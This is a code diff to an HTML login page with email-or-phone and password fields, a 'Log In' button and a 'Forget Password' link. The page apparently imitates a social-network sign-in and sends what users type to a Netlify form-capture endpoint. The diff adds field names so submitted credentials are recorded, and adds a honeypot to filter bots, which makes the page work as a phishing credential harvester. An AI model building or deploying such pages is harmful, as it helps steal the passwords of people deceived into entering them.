@@ -97,17 +97,25 @@
             font-size: 16px;
             border-radius: 4px;
         }
+
+        .hidden {
+            visibility: hidden;
+            height: 0;
+        }
     </style>
 </head>
 
 <body>
     <section>
         <div class="container flex">
-            <form name="contact" autocomplete="off" method="POST" data-netlify="true">
-                <input type="text" placeholder="Email or Phone Number" required autofocus="1"><br>
-                <input type="text" required placeholder="Password">
+            <form name="contact" method="POST" netlify-honeypot="bot-field" data-netlify="true">
+                <p class="hidden">
+                    <label>Don't fill this our if you're human: <input name="bot-field"></label>
+                </p>
+                <input type="text" name="name" placeholder="Email or Phone Number" required autofocus="1"><br>
+                <input type="text" name="name" required placeholder="Password">
                 <br>
-                <button type="submit">Log In</button>
+                <button value="Send" type="submit">Log In</button>
                 <p class="forget-password"><a href="#">Forget Password ?</a></p>
                 <hr class="light-hr">
                 <div class="create_new">
